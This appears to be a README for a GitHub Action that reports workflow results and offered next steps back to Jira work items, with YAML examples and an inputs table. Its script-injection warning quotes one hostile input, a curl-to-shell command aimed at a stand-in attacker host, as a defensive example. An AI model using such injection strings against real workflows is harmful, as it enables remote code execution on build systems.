# huseyinbuyukdere/cuelight-report

Hands a workflow's result and next steps back to the Jira work item that started it, or offers a
next step on any work item from another workflow (for example when a pull request opens).

## Report a run started by Cuelight

The workflow must declare the two inputs Cuelight sends:

```yaml
on:
  workflow_dispatch:
    inputs:
      issue_key: { type: string, required: true }
      cuelight_callback_url: { type: string, required: false }
      cuelight_token: { type: string, required: false }

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: huseyinbuyukdere/cuelight-report@v1
        with:
          status: running
      # ... your steps ...
      - name: Hand back the next step
        if: always()
        uses: huseyinbuyukdere/cuelight-report@v1
        with:
          status: ${{ job.status }}
          message: Deployed ${{ github.sha }}
          next: rollback-staging, promote-production
```

The callback URL and the run token come from the workflow inputs automatically. The token is
valid for 24 hours and only for this run; a second final report gets `409`.

## Offer a next step

```yaml
- uses: huseyinbuyukdere/cuelight-report@v1
  env:
    CUELIGHT_REPORT_URL: ${{ secrets.CUELIGHT_REPORT_URL }}
  with:
    install-key: ${{ secrets.CUELIGHT_INSTALL_KEY }}
    issue-key: SHOP-1
    source: 'PR #${{ github.event.pull_request.number }}'
    next: '[{"action":"deploy-preview","inputs":{"pr":"${{ github.event.pull_request.number }}"}}]'
```

The report URL and the install key are on the Reporting tab of the Cuelight settings in Jira.
Keep the key in a secret; never paste it into a workflow file.

## Inputs

| Input | Use |
|---|---|
| `status` | `running`, `success`, `failure` or `cancelled`. Usually `${{ job.status }}`. Not used for offers. |
| `message` | Plain text shown on the work item, at most 500 characters. |
| `next` | Comma-separated action ids, or a JSON array like `[{"action":"deploy","inputs":{"pr":"12"}}]`. |
| `url` | "View run" link. Must start with `https://github.com/`. Defaults to this workflow run. |
| `install-key` | Sends an offer instead of a run report. |
| `issue-key` | Work item key, required for offers. |
| `source` | Offer label, shown as "Suggested by …" (at most 60 characters). |
| `expires-in-hours` | How long the next steps stay (1–720, default 168). |
| `fail-on-error` | Fail the step when the report can't be delivered (default `false`, which logs a warning). |

Output: `http-status`, the HTTP status Cuelight returned.

## Warning: script injection

Inputs that Cuelight passes to your workflow (`issue_key`, form values like `reason`) are typed by
people. Never put them straight into a `run:` script with `${{ inputs.reason }}`; a value like
`"; curl evil.example | sh; "` would run as code. Pass them through `env:` and quote the variable:

```yaml
- name: Deploy
  env:
    REASON: ${{ inputs.reason }}
  run: ./deploy.sh --reason "$REASON"
```

Cuelight strips control characters and limits lengths, but it can't know how your script uses a
value. See GitHub's
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).
